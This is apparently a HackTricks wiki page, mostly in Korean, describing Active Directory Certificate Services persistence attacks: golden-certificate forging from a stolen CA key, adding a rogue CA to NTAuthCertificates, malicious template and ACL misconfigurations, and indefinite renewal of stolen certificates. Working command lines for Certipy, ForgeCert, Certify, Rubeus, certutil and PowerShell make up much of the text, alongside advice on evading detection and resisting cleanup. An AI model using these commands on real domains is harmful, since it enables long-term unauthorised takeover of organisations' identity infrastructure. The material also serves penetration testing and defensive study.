# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**이 문서는 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)에 수록된 도메인 지속성(domain persistence) 기법들의 요약입니다. 자세한 내용은 해당 문서를 확인하세요.**

## 도난당한 CA 인증서로 인증서 위조 (Golden Certificate) - DPERSIST1

인증서가 CA 인증서인지 어떻게 판별하는가?

다음 조건들이 충족되면 해당 인증서는 CA 인증서로 판별된다:

- 인증서는 CA 서버에 저장되며, 개인 키는 운영체제가 지원하는 경우 머신의 DPAPI나 TPM/HSM 같은 하드웨어로 보호된다.
- 인증서의 Issuer 및 Subject 필드가 CA의 distinguished name과 일치한다.
- 'CA Version' 확장(extension)이 CA 인증서에만 포함되어 있다.
- 인증서에 Extended Key Usage (EKU) 필드가 없다.

이 인증서의 개인 키를 추출하려면 CA 서버에서 certsrv.msc 도구(내장 GUI)를 사용하는 것이 공식적으로 지원되는 방법이다. 그러나 이 인증서는 시스템에 저장된 다른 인증서와 다르지 않으므로 [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2)와 같은 방법을 사용해 추출할 수 있다.

해당 인증서와 개인 키는 Certipy를 사용해 다음 명령으로 얻을 수도 있다:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
.pfx 형식의 CA 인증서와 개인 키를 확보하면, [ForgeCert](https://github.com/GhostPack/ForgeCert)와 같은 도구를 사용하여 유효한 인증서를 생성할 수 있습니다:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 인증서 위조 대상 사용자는 이 과정이 성공하려면 Active Directory에서 활성 상태이며 인증할 수 있어야 합니다. krbtgt와 같은 특수 계정에 대한 인증서 위조는 효과가 없습니다.

이 위조된 인증서는 **지정된 만료일까지** 그리고 **루트 CA 인증서가 유효한 한** 유효합니다(보통 5년에서 **10년 이상**). 또한 머신에도 유효하므로, **S4U2Self**와 결합하면 공격자는 CA 인증서가 유효한 한 **어떤 도메인 머신에서도 지속성을 유지할 수 있습니다**.\
게다가 이 방법으로 생성된 **인증서들은 CA가 이를 인지하지 못하기 때문에** **폐기(revoke)** 될 수 없습니다.

### Operating under Strong Certificate Mapping Enforcement (2025+)

2025년 2월 11일 이후(KB5014754 배포 후), 도메인 컨트롤러는 인증서 매핑에 대해 기본적으로 **Full Enforcement**를 사용합니다. 실무적으로 이는 위조된 인증서가 다음 중 하나여야 함을 의미합니다:

- 대상 계정에 대한 강력한 바인딩을 포함해야 합니다(예: SID security extension), 또는
- 대상 객체의 `altSecurityIdentities` 속성에 강력하고 명시적인 매핑이 함께 있어야 합니다.

지속성을 위한 신뢰할 수 있는 방법은 도난된 Enterprise CA에 체인된 위조 인증서를 발급하고, 피해자 프린시펄에 강력한 명시적 매핑을 추가하는 것입니다:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
참고
- SID security extension을 포함하는 forged certificates를 만들 수 있다면, 그것들은 Full Enforcement 하에서도 암묵적으로 매핑됩니다. 그렇지 않다면 explicit strong mappings을 선호하세요. 명시적 매핑에 대한 자세한 내용은 [account-persistence](account-persistence.md)를 참조하세요.
- Revocation은 이 경우 방어자에게 도움이 되지 않습니다: forged certificates는 CA database에 등록되어 있지 않으므로 revoked될 수 없습니다.

#### Full-Enforcement compatible forging (SID-aware)

업데이트된 tooling은 SID를 직접 임베드할 수 있게 해주어, DCs가 weak mappings를 거부하더라도 golden certificates를 계속 사용 가능하게 합니다:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
SID를 임베딩하면 `altSecurityIdentities`를 건드릴 필요가 없어져(해당 속성이 모니터링될 수 있음) 강력한 매핑 검사를 만족시키면서도 탐지를 피할 수 있습니다.

## Trusting Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **CA certificates** within its `cacertificate` attribute, which Active Directory (AD) utilizes. The verification process by the **domain controller** involves checking the `NTAuthCertificates` object for an entry matching the **CA specified** in the Issuer field of the authenticating **certificate**. Authentication proceeds if a match is found.

A self-signed CA certificate can be added to the `NTAuthCertificates` object by an attacker, provided they have control over this AD object. Normally, only members of the **Enterprise Admin** group, along with **Domain Admins** or **Administrators** in the **forest root’s domain**, are granted permission to modify this object. They can edit the `NTAuthCertificates` object using `certutil.exe` with the command `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, or by employing the [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

이 기술에 유용한 추가 명령들:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
이 기능은 이전에 설명한 ForgeCert를 사용해 동적으로 인증서를 생성하는 방법과 함께 사용할 때 특히 관련성이 큽니다.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## 악성 구성 오류 - DPERSIST3

**AD CS** 구성 요소들의 **security descriptor** 수정을 통한 **persistence** 기회는 다수 존재합니다. "[Domain Escalation](domain-escalation.md)" 섹션에서 설명된 수정들은 권한이 상승된 공격자가 악의적으로 구현할 수 있습니다. 여기에는 다음과 같은 민감한 구성 요소들에 대한 "제어 권한"(예: WriteOwner/WriteDACL/etc.) 추가가 포함됩니다:

- **CA 서버의 AD 컴퓨터** 객체
- **CA 서버의 RPC/DCOM 서버**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 위치의 모든 **하위 AD 객체 또는 컨테이너** (예: Certificate Templates 컨테이너, Certification Authorities 컨테이너, NTAuthCertificates 객체 등)
- 기본적으로 또는 조직에 의해 **AD CS 제어 권한이 위임된 AD 그룹** (예: 내장 Cert Publishers 그룹 및 그 멤버들)

악의적 구현의 예로는 도메인에서 **elevated permissions**을 가진 공격자가 기본 **`User`** 인증서 템플릿에 **`WriteOwner`** 권한을 추가하고 자신을 해당 권한의 주체로 설정하는 경우가 있습니다. 이를 악용하려면 공격자는 먼저 **`User`** 템플릿의 소유권을 자신으로 변경합니다. 그 다음 템플릿에서 **`mspki-certificate-name-flag`**를 **1**로 설정해 **`ENROLLEE_SUPPLIES_SUBJECT`**를 활성화하면, 요청에서 Subject Alternative Name을 제공할 수 있게 됩니다. 이후 공격자는 해당 **템플릿**으로 **enroll**하여 대체 이름으로 **도메인 관리자** 이름을 선택하고, 획득한 인증서를 DA로서의 인증에 사용할 수 있습니다.

장기적인 도메인 persistence를 위해 공격자가 설정할 수 있는 실무적인 조정들(자세한 내용 및 탐지는 {{#ref}}domain-escalation.md{{#endref}} 참조):

- 요청자(requesters)로부터 SAN을 허용하는 CA 정책 플래그(예: `EDITF_ATTRIBUTESUBJECTALTNAME2` 활성화). 이는 ESC1 유사 경로들을 계속 악용 가능하게 유지합니다.
- 인증 가능 발급(authentication-capable issuance)을 허용하는 템플릿 DACL 또는 설정(예: Client Authentication EKU 추가, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 활성화).
- 방어자가 정리(cleanup)를 시도할 경우 악성 발급자를 지속적으로 재도입하기 위해 `NTAuthCertificates` 객체 또는 CA 컨테이너를 제어.

> [!TIP]
> KB5014754 이후 강화된 환경에서는 이러한 잘못된 구성들을 명시적인 강력 매핑(`altSecurityIdentities`)과 결합하면, DC들이 강력한 매핑을 적용하더라도 발급되거나 위조된 인증서를 계속 사용 가능하게 할 수 있습니다.

### Certificate renewal abuse (ESC14) for persistence

인증에 사용 가능한 인증서(authentication-capable certificate) 또는 Enrollment Agent 인증서를 탈취하면, 발급 템플릿이 계속 게시되어 있고 CA가 여전히 발급자 체인을 신뢰하는 한 해당 인증서를 **무기한 갱신**할 수 있습니다. 갱신은 원래의 identity bindings을 유지하면서 유효기간을 연장하므로, 템플릿을 수정하거나 CA를 재게시하지 않는 한 퇴출이 어려워집니다.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
도메인 컨트롤러가 **Full Enforcement** 상태인 경우, 갱신된 리프 인증서가 `altSecurityIdentities`를 건드리지 않고도 강하게 매핑되도록 `-sid <victim SID>`(또는 SID 보안 확장을 여전히 포함하는 템플릿)을 추가하세요. CA 관리자 권한을 가진 공격자는 자체적으로 인증서를 발급하기 전에 갱신된 수명을 늘리기 위해 `policy\RenewalValidityPeriodUnits`를 조정할 수도 있습니다.

## References

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
